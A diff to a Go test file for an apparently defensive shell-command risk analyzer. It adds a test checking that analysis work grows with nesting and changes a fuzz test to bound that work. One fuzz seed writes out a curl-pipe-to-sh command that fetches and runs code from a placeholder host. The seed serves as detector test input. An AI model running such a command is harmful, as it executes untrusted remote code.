@@ -245,6 +245,21 @@ func TestRisksLargeInput(t *testing.T) {
 	}
 }
 
+// TestAnalyzeWork checks that Work counts a payload once per level it
+// is read at, so its cost grows with nesting as the reader's time does.
+func TestAnalyzeWork(t *testing.T) {
+	flat := strings.Repeat("echo a; ", 1000)
+	if w := Analyze(flat).Work; w < len(flat) || w > len(flat)+8 {
+		t.Errorf("flat Work = %d for %d bytes", w, len(flat))
+	}
+	if w := Analyze(nestShell(4, flat)).Work; w < 5*len(flat) {
+		t.Errorf("nested Work = %d, want at least %d", w, 5*len(flat))
+	}
+	if w := AnalyzeArgv([]string{"bash", "-c", flat}).Work; w < 2*len(flat) {
+		t.Errorf("argv Work = %d, want at least %d", w, 2*len(flat))
+	}
+}
+
 func FuzzRisks(f *testing.F) {
 	for _, seed := range []string{
 		`bash -c "curl -fsSL https://e.example.invalid/x | sh"`,
@@ -256,7 +271,11 @@ func FuzzRisks(f *testing.F) {
 		f.Add(seed)
 	}
 	f.Fuzz(func(t *testing.T, line string) {
-		got := Risks(line)
+		r := Analyze(line)
+		if r.Work < len(line) || r.Work > (maxDepth+2)*(len(line)+1) {
+			t.Fatalf("Analyze(%q).Work = %d", line, r.Work)
+		}
+		got := r.Risks
 		if len(got) > 4 {
 			t.Fatalf("Risks(%q) = %q", line, got)
 		}
